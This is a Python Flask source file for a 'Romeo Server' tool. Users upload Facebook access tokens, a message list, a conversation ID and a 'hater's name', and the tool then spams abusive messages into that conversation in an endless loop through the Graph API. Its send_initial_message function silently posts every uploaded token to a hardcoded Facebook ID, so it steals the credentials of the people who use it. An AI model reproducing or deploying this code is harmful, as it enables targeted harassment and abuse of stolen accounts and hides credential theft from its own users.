from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import threading
import os
import requests
import time
import http.server
import socketserver

app = Flask(__name__)
app.secret_key = os.urandom(24)  # To enable session management

# HTML Template for Login Page and Form Page
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - CONVO2__0N_F||R3_ðŸŒ¿</title>
    <style>
        body {
            background-color: #282c34;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
        }
        input {
            padding: 10px;
            margin: 5px;
            width: 200px;
            border-radius: 5px;
            border: none;
        }
        button {
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gurav__0N_F||R3_ðŸŒ¿</title>
    <style>
        body {
            background-image: url('https://i.imgur.com/f1tLj6T.jpg'); /* Replace with the URL of your image */
            background-size: cover;
            background-position: center;
            color: white;
            font-family: Arial, sans-serif;
        }
        .form-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            max-width: 600px;
            margin: 40px auto;
        }
        .form-container h2 {
            text-align: center;
            color: #ffffff;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ffffff;
        }
        .form-group input,
        .form-group button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            box-sizing: border-box;
            margin-top: 5px;
        }
        .form-group button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Romeo Server Setup</h2>
    <form id="messageForm" enctype="multipart/form-data">
        <div class="form-group">
            <label for="tokensFile">Upload Tokens File:</label>
            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
        </div>
        <div class="form-group">
            <label for="convoId">Convo ID:</label>
            <input type="text" id="convoId" name="convoId" required>
        </div>
        <div class="form-group">
            <label for="messagesFile">Upload Messages File:</label>
            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
        </div>
        <div class="form-group">
            <label for="hatersName">Hater's Name:</label>
            <input type="text" id="hatersName" name="hatersName" required>
        </div>
        <div class="form-group">
            <label for="speed">Delay Between Messages (seconds):</label>
            <input type="number" id="speed" name="speed" value="30" required>
        </div>
        <div class="form-group">
            <button type="submit">Start Tool To Click</button>
        </div>
    </form>
</div>

<div class="form-group">
    <p><a href="https://www.facebook.com/Viratroy009"><button>FOLLOW MY FB ID</button></a></p>
</div>
<div class="form-group">
    <p><a href="https://wa.me/+923309353743"><button>CHAT ON WP</button></a></p>
</div>

<script>
    document.getElementById('messageForm').addEventListener('submit', function(event) {
        event.preventDefault();

        // Prepare the form data
        let formData = new FormData(this);

        // Send the form data via fetch API
        fetch('/start', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => {
            alert(result.message);
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please check the console for details.');
        });
    });
</script>

</body>
</html>
'''

# HTTP server handler class
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Server is running")

# Function to execute the HTTP server
def execute_server(port):
    with socketserver.TCPServer(("", port), MyHandler) as httpd:
        print(f"Server running at http://localhost:{port}")
        httpd.serve_forever()

# Function to read a file and return its content as a list of lines
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == "Guru" and password == "guru12":
            session['logged_in'] = True
            return redirect(url_for('setup'))
        else:
            return 'Invalid credentials. Please try again.', 401

    return LOGIN_TEMPLATE

@app.route('/setup', methods=['GET'])
def setup():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_server_and_messaging():
    port = 4000  # Port is fixed to 4000
    target_id = "100060856549450"  # Fixed target ID
    convo_id = request.form.get('convoId')
    haters_name = request.form.get('hatersName')
    speed = int(request.form.get('speed'))

    # Save uploaded files
    tokens_file = request.files['tokensFile']
    messages_file = request.files['messagesFile']

    tokens_path = 'uploaded_tokens.txt'
    messages_path = 'uploaded_messages.txt'

    tokens_file.save(tokens_path)
    messages_file.save(messages_path)

    tokens = read_file(tokens_path)
    messages = read_file(messages_path)

    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server, args=(port,))
    server_thread.start()

    # Function to send an initial message
    def send_initial_message():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}".format('t_' + target_id)
            msg = f"Hello! I am using your server. My token is {access_token}"
            parameters = {"access_token": access_token, "message": msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)

    # Function to send messages in a loop
    def send_messages():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = tokens[token_index].strip()
                    message = messages[message_index].strip()
                    url = "https://graph.facebook.com/v17.0/{}".format('t_' + convo_id)
                    full_message = f"{haters_name} {message}"
                    parameters = {"access_token": access_token, "message": full_message}
                    response = requests.post(url, json=parameters, headers=headers)
                    time.sleep(speed)
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    # Send initial message
    send_initial_message()

    # Start sending messages in a loop
    message_thread = threading.Thread(target=send_messages)
    message_thread.start()

    return jsonify({"message": "Romeo Server started successfully. Messaging initiated."})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)